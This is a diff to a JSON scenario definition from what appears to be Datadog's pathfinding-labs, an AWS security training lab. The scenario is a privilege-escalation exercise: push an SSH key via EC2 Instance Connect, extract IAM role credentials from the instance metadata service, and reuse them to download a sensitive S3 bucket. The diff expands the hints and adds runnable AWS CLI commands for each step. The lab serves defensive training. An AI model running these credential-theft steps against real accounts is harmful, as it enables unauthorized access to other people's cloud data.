@@ -1,5 +1,5 @@
 {
-  "displayName": "Privilege Escalation via ec2-instance-connect:SendSSHPublicKey to S3 Bucket",
+  "displayName": "EC2 Instance Connect SSH to Bucket",
   "name": "ec2-003-ec2-instance-connect-sendsshpublickey",
   "description": "SSH into EC2 instance via Instance Connect and extract IAM role credentials from IMDS for S3 bucket access",
   "costEstimate": "$8/mo",
@@ -33,11 +33,12 @@
     "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-bucket/ec2-003-ec2-instance-connect-sendsshpublickey"
   },
   "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-bucket/ec2-003-ec2-instance-connect-sendsshpublickey",
-  "schemaVersion": "3.0.0",
+  "schemaVersion": "4.0.0",
   "permissions": {
     "required": [
       {
         "permission": "ec2-instance-connect:SendSSHPublicKey",
+        "principal": "pl-prod-ec2-003-to-bucket-starting-user",
         "resource": "arn:aws:ec2:*:{account_id}:instance/{target_instance_id}",
         "description": "push a temporary SSH public key to the target EC2 instance"
       }
@@ -45,18 +46,22 @@
     "helpful": [
       {
         "permission": "ec2:DescribeInstances",
+        "principal": "pl-prod-ec2-003-to-bucket-starting-user",
         "purpose": "discover EC2 instances with S3 bucket access roles attached"
       },
       {
         "permission": "iam:GetInstanceProfile",
+        "principal": "pl-prod-ec2-003-to-bucket-starting-user",
         "purpose": "view the instance profile to determine which role is attached"
       },
       {
         "permission": "iam:GetRole",
+        "principal": "pl-prod-ec2-003-to-bucket-starting-user",
         "purpose": "view role permissions and confirm S3 bucket access"
       },
       {
         "permission": "s3:ListBucket",
+        "principal": "pl-prod-ec2-003-to-bucket-starting-user",
         "purpose": "verify S3 access after credential extraction"
       }
     ]
@@ -140,23 +145,33 @@
         "label": "ec2-instance-connect:SendSSHPublicKey",
         "description": "Push a temporary SSH public key to the EC2 instance using EC2 Instance Connect. The key is valid for 60 seconds \u2014 enough time to establish an SSH session.\n",
         "hints": [
-          "You can push SSH public keys to EC2 instances. What can you do once you have shell access?",
-          "Look for EC2 instances that have IAM roles attached with interesting permissions.",
-          "EC2 instances expose temporary IAM credentials via the Instance Metadata Service (IMDS).",
-          "Browse to https://pathfinding.cloud/paths/ec2-003 for technique details."
+          "Use ec2:DescribeInstances to list running EC2 instances and identify which ones have IAM instance profiles attached.",
+          "Use iam:GetInstanceProfile to inspect the instance profile and find the IAM role name attached to the target instance.",
+          "Use iam:GetRole to review the permissions on the attached role and confirm it has access to the target S3 bucket.",
+          "You can push a temporary SSH public key to an EC2 instance using ec2-instance-connect:SendSSHPublicKey \u2014 but you'll need the instance's availability zone as well as its public IP.",
+          "Generate a local SSH key pair first, then push the public key to the instance. The key is only valid for 60 seconds, so have your SSH command ready before pushing.",
+          "Browse to https://pathfinding.cloud/paths/ec2-003 for full technique details."
         ],
         "commands": [
+          {
+            "description": "List running EC2 instances and their attached instance profiles",
+            "command": "aws ec2 describe-instances --region REGION --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress,IamInstanceProfile.Arn]' --output table"
+          },
+          {
+            "description": "Get the availability zone of the target instance (required for SendSSHPublicKey)",
+            "command": "aws ec2 describe-instances --region REGION --instance-ids INSTANCE_ID --query 'Reservations[0].Instances[0].Placement.AvailabilityZone' --output text"
+          },
           {
             "description": "Generate a temporary SSH key pair",
             "command": "ssh-keygen -t rsa -f /tmp/ec2-003-temp-key -N '' -q"
           },
           {
-            "description": "Push the public key to the EC2 instance (replace INSTANCE_ID, REGION, and AZ)",
+            "description": "Push the public key to the EC2 instance (valid for 60 seconds)",
             "command": "aws ec2-instance-connect send-ssh-public-key --instance-id INSTANCE_ID --instance-os-user ec2-user --ssh-public-key file:///tmp/ec2-003-temp-key.pub --availability-zone AVAILABILITY_ZONE --region REGION"
           },
           {
-            "description": "SSH into the instance within the 60-second window (replace INSTANCE_IP)",
-            "command": "ssh -i /tmp/ec2-003-temp-key -o StrictHostKeyChecking=no ec2-user@INSTANCE_IP"
+            "description": "SSH into the instance within the 60-second window",
+            "command": "ssh -i /tmp/ec2-003-temp-key -o StrictHostKeyChecking=no ec2-user@INSTANCE_PUBLIC_IP"
           }
         ]
       },
@@ -166,9 +181,10 @@
         "label": "IMDS credential extraction",
         "description": "From within the EC2 instance, query IMDSv2 to retrieve the temporary IAM role credentials associated with the attached instance profile.\n",
         "hints": [
-          "Query the Instance Metadata Service (IMDS) from within the instance.",
-          "Use IMDSv2: first get a session token, then query the credentials endpoint.",
-          "The credentials endpoint is: http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+          "EC2 instances expose temporary IAM credentials to their workloads via the Instance Metadata Service at 169.254.169.254.",
+          "This instance requires IMDSv2: you must first request a session token before querying for credentials.",
+          "Query the security-credentials endpoint to get the role name, then query again with the role name to get the actual credentials.",
+          "The returned JSON contains AccessKeyId, SecretAccessKey, and Token \u2014 all three are needed."
         ],
         "commands": [
           {
@@ -191,13 +207,18 @@
         "label": "s3:GetObject, s3:ListBucket",
         "description": "Use the EC2 bucket role's temporary credentials to list and download objects from the sensitive S3 bucket.\n",
         "hints": [
-          "Export the extracted credentials as environment variables.",
-          "The credentials are fully valid AWS credentials that can be used from any location."
+          "Export the extracted credentials as AWS environment variables on your local machine \u2014 they are fully valid from anywhere.",
+          "The role's permissions are limited to the specific S3 bucket. Confirm access by listing the bucket first, then download the contents.",
+          "These are temporary session credentials \u2014 they include a session token that must be set alongside the access key and secret."
         ],
         "commands": [
           {
             "description": "Export the extracted credentials as environment variables",
             "command": "export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId) AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey) AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .Token)"
+          },
+          {
+            "description": "Verify the new identity",
+            "command": "aws sts get-caller-identity"
           },
           {
             "description": "List objects in the sensitive S3 bucket",
